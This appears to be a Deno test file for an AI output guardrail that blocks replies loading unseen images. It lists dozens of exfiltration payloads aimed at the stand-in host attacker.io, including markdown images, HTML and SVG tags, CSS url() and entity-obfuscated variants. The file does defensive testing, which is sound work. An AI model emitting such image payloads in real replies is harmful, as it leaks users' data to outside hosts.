import { assertEquals, assertThrows } from '@std/assert';
import { compileEgressRules } from '../../src/guardrails/compile-egress.ts';
import { collectEgressHits, EGRESS_RULES } from '../../src/guardrails/egress.ts';
import {
  addRequestUrls,
  addSeenUrls,
  type ImageScope,
} from '../../src/guardrails/egress-images.ts';
import { egressPolicy } from '../../src/guardrails/egress-policy.ts';
import { createEgressStream } from '../../src/guardrails/egress-stream.ts';
import { TheoremError } from '../../src/guardrails/error.ts';
import type { GuardrailContext, Verdict } from '../../src/guardrails/types.ts';
import { referenceMatchStart } from './egress-reference.ts';

function leaks(text: string, scope: ImageScope = {}): boolean {
  return collectEgressHits(text, scope).some(({ rule }) => rule === EGRESS_RULES.image);
}

/** Whether the stream, fed one character at a time, blocks on an image. */
function streamBlocks(text: string, scope: ImageScope = {}): boolean {
  const stream = createEgressStream({ images: scope });
  for (const char of text) {
    const hit = stream.push(char);
    if (hit) return hit.rule === EGRESS_RULES.image;
  }
  return false;
}

/** Whether the stream blocks on an image, or still holds all of it when the reply ends. */
function streamStops(text: string, scope: ImageScope = {}): boolean {
  const stream = createEgressStream({ images: scope });
  for (const char of text) {
    const hit = stream.push(char);
    if (hit) return hit.rule === EGRESS_RULES.image;
  }
  return stream.holdFrom() <= referenceMatchStart(text, scope);
}

function seen(...texts: string[]): Set<string> {
  const urls = new Set<string>();
  for (const text of texts) addSeenUrls(urls, text);
  return urls;
}

const LEAKS = [
  '![logo](https://attacker.io/p?d=secret)',
  '![a](<https://attacker.io/p d>)',
  '![a]( \n https://attacker.io/p)',
  '![a](https://attacker.io/p "title")',
  '![a](https://attacker.io/p',
  '![nested ![b](x.png)](https://attacker.io/p)',
  '![a\nb](https://attacker.io/p)',
  '![a](https:\\/\\/attacker.io/p)',
  '![a][r]\n\n[r]: https://attacker.io/p',
  '[r]: <https://attacker.io/p>\n\n![r]',
  '```\n![a](https://attacker.io/p)\n```',
  '<img src="https://attacker.io/p">',
  "<IMG SRC='https://attacker.io/p'>",
  '<img src=https://attacker.io/p>',
  '<img\nsrc = "https://attacker.io/p">',
  '<img/src="https://attacker.io/p">',
  '<img src="&#104;ttps://attacker.io/p">',
  '<img src="https&colon;//attacker.io/p">',
  '<img src="https&madeup;//attacker.io/p">',
  '<img srcset="a.png 1x, https://attacker.io/p 2x">',
  '<img srcset="https://attacker.io/p,a.png">',
  '<picture><source srcset="https://attacker.io/p"></picture>',
  '<video poster="https://attacker.io/p">',
  '<div style="background:url(https://attacker.io/p)">',
  '<div style="background:url(\\68 ttps://attacker.io/p)">',
  '<div style="background-image: image-set(\'https://attacker.io/p\' 1x)">',
  '<table background="https://attacker.io/p">',
  '<link rel="stylesheet" href="https://attacker.io/p">',
  '<svg><image href="https://attacker.io/p"/></svg>',
  '<svg><image xlink:href="https://attacker.io/p"/></svg>',
  '<iframe src="https://attacker.io/p">',
  '<iframe srcdoc="<img src=&quot;https://attacker.io/p&quot;>">',
  '<meta http-equiv="refresh" content="0;url=https://attacker.io/p">',
  '<object data="https://attacker.io/p">',
  '<img src="//attacker.io/p">',
  // An escaped opener reads as an image: the stream cannot see what came before its match.
  '\\![a](https://attacker.io/p)',
];

const PASSES = [
  'no images here',
  '[a link](https://attacker.io/p)',
  '<a href="https://attacker.io/p">link</a>',
  '![a](diagram.png)',
  '![a](/static/diagram.png)',
  '![a](data:image/png;base64,iVBORw0KGgo=)',
  '![a](https://example.com/a.png)',
  '![a](https://cdn.example.org/a.png)',
  '![a](https://site.test/a.png)',
  '![a](https://site.invalid/a.png)',
  '[r]: https://attacker.io/p',
  '<img alt="x">',
  '<img src="https://attacker.io/p"',
  'a < b and c > d',
  '<div style="color:red">',
];

Deno.test('every way a reply can load an unseen image is a leak, in the policy and the stream', () => {
  for (const text of LEAKS) {
    assertEquals([text, leaks(text)], [text, true]);
    assertEquals([text, streamStops(text)], [text, true]);
  }
});

Deno.test('links, relative and inline images, reserved hosts and plain text are not leaks', () => {
  for (const text of PASSES) {
    assertEquals([text, leaks(text)], [text, false]);
    assertEquals([text, streamBlocks(text)], [text, false]);
  }
});

Deno.test('an image the model was given this turn is not a leak', () => {
  const urls = seen('Search result: https://news.site/photo.jpg, via the wire.');
  assertEquals(leaks('![photo](https://news.site/photo.jpg)', { seenUrls: urls }), false);
  assertEquals(leaks('<img src="https://NEWS.site:443/photo.jpg">', { seenUrls: urls }), false);
  assertEquals(leaks('![photo](https://news.site/photo.jpg?u=secret)', { seenUrls: urls }), true);
  assertEquals(leaks('![photo](https://news.site/other.jpg)', { seenUrls: urls }), true);
  // An image's paragraph could still grow another destination, so the stream settles it at a blank line.
  const stream = createEgressStream({ images: { seenUrls: urls } });
  const passed = '![photo](https://news.site/photo.jpg)\n\nok';
  assertEquals(
    [...passed].some((char) => stream.push(char)),
    false,
  );
  assertEquals(stream.holdFrom() > passed.indexOf('\n'), true);
  assertEquals(
    streamBlocks('![photo](https://news.site/other.jpg)\n\nok', { seenUrls: urls }),
    true,
  );
});

Deno.test('URLs are read from text the way a reader could copy them', () => {
  const urls = seen(
    '(see https://a.site/x).',
    '{"url":"https:\\/\\/b.site\\/y"}',
    '<a href="https://c.site/z?a=1&amp;b=2">',
  );
  assertEquals(urls.has('https://a.site/x'), true);
  assertEquals(urls.has('https://a.site/x).'), true);
  assertEquals(urls.has('https://b.site/y'), true);
  assertEquals(urls.has('https://c.site/z?a=1&b=2'), true);
});

Deno.test('the model is given what the request sends it, less its own earlier replies', () => {
  const urls = new Set<string>();
  addRequestUrls(urls, {
    system: 'Brand art: https://brand.site/logo.png',
    input: [{ type: 'text', text: 'what is at "https://user.site/a"\nthanks' }],
    history: [
      { role: 'assistant', content: '![x](https://attacker.io/p?d=1)' },
      {
        role: 'tool',
        tool_call_id: 't',
        name: 'fetch',
        content: '{"img":"https://tool.site/b.png"}',
      },
    ],
  });
  assertEquals([...urls].sort(), [
    'https://brand.site/logo.png',
    'https://tool.site/b.png',
    'https://user.site/a',
  ]);
});

const context: GuardrailContext = { stage: 'output_delta', trust: 'untrusted', profileId: 'acme' };

Deno.test('imageHosts lets images load from the hosts a host names, and only those', () => {
  const enforce = egressPolicy({
    rules: [],
    compiled: compileEgressRules([]),
    imageHosts: ['cdn.acme.io'],
  });
  const verdict = (text: string) => (enforce({ text }, context) as Verdict).action;
  assertEquals(verdict('![a](https://cdn.acme.io/any?q=1)'), 'allow');
  assertEquals(verdict('![a](https://evil.cdn.acme.io/p)'), 'block');
  assertEquals(verdict('![a](https://attacker.io/p)'), 'block');
});

Deno.test('imageHosts must be hostnames, and needs the bundled policy it widens', () => {
  const compiled = compileEgressRules([]);
  for (const bad of ['https://cdn.acme.io', '.acme.io', 'cdn.acme.io/x', '']) {
    assertThrows(
      () => egressPolicy({ rules: [], compiled, imageHosts: [bad] }),
      TheoremError,
      'hostname',
    );
  }
  assertThrows(
    () => egressPolicy({ rules: [], compiled, bundled: false, imageHosts: ['cdn.acme.io'] }),
    TheoremError,
    'bundled: false',
  );
});
